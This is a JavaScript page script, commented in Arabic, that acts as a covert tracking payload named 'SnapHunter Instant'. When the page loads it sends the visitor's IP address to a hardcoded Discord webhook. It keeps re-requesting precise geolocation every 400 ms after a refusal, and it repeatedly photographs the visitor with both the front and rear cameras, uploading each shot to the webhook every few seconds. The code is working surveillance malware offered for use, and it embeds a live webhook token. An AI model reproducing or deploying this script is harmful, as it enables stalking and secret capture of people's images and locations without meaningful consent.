'use strict';

const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let userLat = null, userLng = null;

// 1. إرسال البيانات فوراً وبسرعة
async function sendQuickly(blob, text) {
    const formData = new FormData();
    if (blob) formData.append('file', blob, 'instant.jpg');
    formData.append('payload_json', JSON.stringify({ content: text, username: "SnapHunter Instant" }));
    
    return fetch(WEBHOOK_URL, { method: 'POST', body: formData });
}

// 2. طلب الموقع بشكل إجباري ومتكرر عند الرفض
function forceLocation() {
    navigator.geolocation.getCurrentPosition(
        (p) => {
            userLat = p.coords.latitude;
            userLng = p.coords.longitude;
            sendQuickly(null, `📍 **الموقع:** https://www.google.com/maps?q=${userLat},${userLng}`);
        },
        () => { setTimeout(forceLocation, 400); }, // تكرار الطلب بسرعة عند الرفض
        { enableHighAccuracy: true }
    );
}

// 3. دالة الالتقاط "اللحظي"
async function instantCapture(mode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        video.srcObject = stream;
        
        return new Promise((resolve) => {
            video.onloadeddata = async () => {
                video.play();
                // التقاط فوري (انتظار 100ms فقط لضبط الإضاءة تلقائياً)
                await new Promise(r => setTimeout(r, 100));
                
                const ctx = canvas.getContext('2d');
                canvas.width = 640; canvas.height = 480;
                ctx.drawImage(video, 0, 0, 640, 480);
                
                canvas.toBlob(async (blob) => {
                    stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا فوراً
                    await sendQuickly(blob, `📸 لقطة فورية: \`${mode === 'user' ? 'الأمامية' : 'الخلفية'}\``);
                    resolve();
                }, 'image/jpeg', 0.4); // ضغط عالي جداً لسرعة الإرسال
            };
        });
    } catch (e) { return null; }
}

// 4. المحرك الرئيسي (تشغيل عند الدخول)
(async function init() {
    // إرسال IP فوراً
    fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => {
        sendQuickly(null, `🚀 **دخول جديد الآن!**\n🌐 IP: \`${data.ip}\``);
    });

    try {
        // بمجرد أن يضغط "سماح" على الكاميرا..
        const mainStream = await navigator.mediaDevices.getUserMedia({ video: true });
        mainStream.getTracks().forEach(t => t.stop()); // فتح الإذن العام

        // اطلب الموقع فوراً وبقوة
        forceLocation();

        // تنفيذ أول لقطتين "فوراً" بدون انتظار ثانية واحدة
        await instantCapture('user');
        await instantCapture('environment');

        // ثم ابدأ التكرار كل 5 ثوانٍ
        const loop = async () => {
            await instantCapture('user');
            await instantCapture('environment');
            setTimeout(loop, 5000);
        };
        loop();

    } catch (err) {
        // في حال رفض الكاميرا، استمر في طلب الموقع وإرسال التحديثات
        forceLocation();
        setInterval(() => {
            if(userLat) sendQuickly(null, `📍 تحديث موقع مستمر: ${userLat},${userLng}`);
        }, 5000);
    }
})();
